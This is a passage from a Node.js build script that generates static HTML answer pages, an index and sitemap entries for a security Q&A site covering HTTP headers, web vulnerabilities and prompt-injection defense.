  ).join('\n');

  return `
    <h2>Recommended Value</h2>
    <pre><code>${escHtml(data.headerValue)}</code></pre>

    <h2>What Each Directive Does</h2>
    <table>
      <thead><tr><th>Directive</th><th>Purpose</th></tr></thead>
      <tbody>
${directiveRows}
      </tbody>
    </table>

    <h2>What Happens Without This Header</h2>
    <p>${data.risks}</p>

    <h2>How to Implement</h2>
    <pre><code>${escHtml(data.implementation)}</code></pre>

    <h2>Testing and Report-Only</h2>
    <p>${data.reportOnly}</p>
`;
}

function buildWebSecPage(data) {
  const typeBlocks = data.types.map(t => {
    let block = `    <h3>${t.name}</h3>\n    <p>${t.desc}</p>`;
    if (t.example) {
      block += `\n    <pre><code>${escHtml(t.example)}</code></pre>`;
    }
    return block;
  }).join('\n\n');

  return `
    <h2>Types of ${data.shortTitle || data.title.replace('What Is ', '')}</h2>
${typeBlocks}

    <h2>How to Prevent It</h2>
    <pre><code>${escHtml(data.prevention)}</code></pre>

    <h2>Real-World Impact</h2>
    <p>${data.impact}</p>
`;
}

function buildLLMSecPage(data) {
  return data.sections.map(s =>
    `    <h2>${s.heading}</h2>\n    <p>${s.content}</p>`
  ).join('\n\n');
}

function escHtml(str) {
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

function getAllSlugs() {
  const slugs = new Set();
  SECURITY_HEADERS.forEach(h => slugs.add(h.slug));
  WEB_SECURITY.forEach(w => slugs.add(w.slug));
  LLM_SECURITY.forEach(l => slugs.add(l.slug));
  // Also include V30 pages (without .html)
  PROTECTED.forEach(p => slugs.add(p.replace('.html', '')));
  return slugs;
}

// ─── INDEX PAGE ─────────────────────────────────────────────────────────────

function buildIndex() {
  const v30Pages = [
    { slug: 'what-is-prompt-injection', title: 'What Is Prompt Injection?' },
    { slug: 'how-to-prevent-prompt-injection', title: 'How to Prevent Prompt Injection' },
    { slug: 'dan-jailbreak-explained', title: 'DAN Jailbreak Explained' },
    { slug: 'system-prompt-best-practices', title: 'System Prompt Best Practices' },
    { slug: 'is-my-chatbot-secure', title: 'Is My Chatbot Secure?' },
    { slug: 'owasp-llm-top-10', title: 'OWASP LLM Top 10' },
    { slug: 'how-to-write-a-secure-system-prompt', title: 'How to Write a Secure System Prompt' },
    { slug: 'what-is-indirect-prompt-injection', title: 'What Is Indirect Prompt Injection?' },
  ];

  const sections = [
    { title: 'Security Headers', items: SECURITY_HEADERS },
    { title: 'Web Security Fundamentals', items: WEB_SECURITY },
    { title: 'LLM & AI Security', items: LLM_SECURITY },
    { title: 'Prompt Security', items: v30Pages },
  ];

  const body = sections.map(s => {
    const links = s.items.map(i =>
      `      <li><a href="/answers/${i.slug}.html">${i.title || i.shortTitle}</a></li>`
    ).join('\n');
    return `    <h2>${s.title}</h2>\n    <ul>\n${links}\n    </ul>`;
  }).join('\n\n');

  const totalPages = v30Pages.length + SECURITY_HEADERS.length + WEB_SECURITY.length + LLM_SECURITY.length;

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" type="image/svg+xml" href="/favicon.svg">
  <title>Security Answers — ${totalPages} Questions Answered | LochBot</title>
  <meta name="description" content="Expert answers to ${totalPages} security questions covering HTTP headers, web vulnerabilities, LLM security, and prompt injection defense.">
  <meta name="robots" content="index, follow">
  <link rel="canonical" href="${BASE_URL}/answers/">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
  <meta property="og:title" content="Security Answers — ${totalPages} Questions Answered | LochBot">
  <meta property="og:description" content="Expert answers to ${totalPages} security questions.">
  <meta property="og:url" content="${BASE_URL}/answers/">
  <meta property="og:type" content="website">
  <meta property="og:image" content="${BASE_URL}/assets/og-image.png">
  <meta property="og:site_name" content="Zovo Tools">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Security Answers — ${totalPages} Questions Answered | LochBot">
  <meta name="twitter:description" content="Expert answers to ${totalPages} security questions.">
  <meta name="twitter:image" content="${BASE_URL}/assets/og-image.png">
  <link rel="stylesheet" href="/assets/style.css">
</head>
<body>
  <header>
    <div class="container header-inner">
      <a href="/" class="logo">Loch<span>Bot</span></a>
      <button class="mobile-toggle" aria-label="Menu">&#9776;</button>
      <nav>
        <a href="/">Scanner</a>
        <a href="/about.html">About</a>
        <a href="/blog/">Blog</a>
        <div class="nav-right">
          <a href="https://zovo.one/pricing?utm_source=lochbot.com&amp;utm_medium=satellite&amp;utm_campaign=nav-link" class="nav-pro" target="_blank">Go Pro &#10022;</a>
          <a href="https://zovo.one/tools" class="nav-zovo">Zovo Tools</a>
        </div>
      </nav>
    </div>
  </header>

  <nav class="breadcrumb" aria-label="Breadcrumb">
    <div class="container">
      <a href="/">Home</a> &rsaquo; <span>Answers</span>
    </div>
  </nav>

  <div class="page-content">
    <h1>Security Answers</h1>
    <p>Expert answers to ${totalPages} security questions — HTTP headers, web vulnerabilities, LLM security, and prompt injection defense. Each answer includes code examples, prevention strategies, and related questions.</p>

${body}

    <p style="margin-top:2rem;"><a href="/">Scan your system prompt with LochBot</a> &mdash; free, client-side, no data sent anywhere.</p>
  </div>

  <footer class="site-footer">
    <div class="footer-inner">
      <div class="footer-brand">Zovo Tools</div>
      <div class="footer-tagline">Free developer tools by a solo dev. No tracking.</div>
      <a href="https://zovo.one/pricing?utm_source=lochbot.com&amp;utm_medium=satellite&amp;utm_campaign=footer-link" class="footer-cta">Zovo Lifetime &mdash; $99 once, free forever &rarr;</a>
      <div class="footer-copy">&copy; 2026 <a href="https://zovo.one">Zovo</a> &middot; 47/500 founding spots</div>
    </div>
  </footer>

  <nav class="zovo-network" aria-label="Zovo Tools Network">
    <div class="zovo-network-inner">
      <h3 class="zovo-network-title">Explore More Tools</h3>
      <div class="zovo-network-links">
        <a href="https://abwex.com">ABWex — A/B Testing</a>
        <a href="https://claudflow.com">ClaudFlow — Workflows</a>
        <a href="https://claudhq.com">ClaudHQ — Prompts</a>
        <a href="https://claudkit.com">ClaudKit — API</a>
        <a href="https://enhio.com">Enhio — Text Tools</a>
        <a href="https://epochpilot.com">EpochPilot — Timestamps</a>
        <a href="https://gen8x.com">Gen8X — Color Tools</a>
        <a href="https://gpt0x.com">GPT0X — AI Models</a>
        <a href="https://heytensor.com">HeyTensor — ML Tools</a>
        <a href="https://invokebot.com">InvokeBot — Webhooks</a>
        <a href="https://kappafy.com">Kappafy — JSON</a>
        <a href="https://kappakit.com">KappaKit — Dev Toolkit</a>
        <a href="https://kickllm.com">KickLLM — LLM Costs</a>
        <a href="https://krzen.com">Krzen — Image Tools</a>
        <a href="https://lockml.com">LockML — ML Compare</a>
        <a href="https://ml3x.com">ML3X — Matrix Math</a>
      </div>
    </div>
  </nav>
</body>
</html>`;
}

// ─── SITEMAP UPDATE ─────────────────────────────────────────────────────────

function updateSitemap(newSlugs) {
  let sitemap = fs.readFileSync(SITEMAP_PATH, 'utf8');
  const closingTag = '</urlset>';

  // Add index page if not present
  if (!sitemap.includes(`${BASE_URL}/answers/`)) {
    const indexEntry = `  <url>\n    <loc>${BASE_URL}/answers/</loc>\n    <lastmod>${TODAY}</lastmod>\n    <changefreq>weekly</changefreq>\n    <priority>0.7</priority>\n  </url>\n`;
    sitemap = sitemap.replace(closingTag, indexEntry + closingTag);
  }

  for (const slug of newSlugs) {
    const url = `${BASE_URL}/answers/${slug}.html`;
    if (!sitemap.includes(url)) {
      const entry = `  <url>\n    <loc>${url}</loc>\n    <lastmod>${TODAY}</lastmod>\n    <changefreq>monthly</changefreq>\n    <priority>0.5</priority>\n  </url>\n`;
      sitemap = sitemap.replace(closingTag, entry + closingTag);
    }
  }

  fs.writeFileSync(SITEMAP_PATH, sitemap);
}

// ─── MAIN ───────────────────────────────────────────────────────────────────

function main() {
  if (!fs.existsSync(ANSWERS_DIR)) fs.mkdirSync(ANSWERS_DIR, { recursive: true });

  const allData = [...SECURITY_HEADERS, ...WEB_SECURITY, ...LLM_SECURITY];
  const generated = [];

  for (const data of allData) {
    const filename = `${data.slug}.html`;
    if (PROTECTED.has(filename)) {
      console.log(`  SKIP (V30): ${filename}`);
      continue;
    }

    const html = buildPage(data);
    const outPath = path.join(ANSWERS_DIR, filename);
    fs.writeFileSync(outPath, html);
    generated.push(data.slug);
    console.log(`  GENERATED: ${filename}`);
  }

  // Build index page
  const indexHtml = buildIndex();
  fs.writeFileSync(path.join(ANSWERS_DIR, 'index.html'), indexHtml);
  console.log('  GENERATED: index.html');

  // Update sitemap
  updateSitemap(generated);
  console.log(`  SITEMAP: added ${generated.length} URLs`);

  console.log(`\nDone. Generated ${generated.length} answer pages + index.`);
}

main();
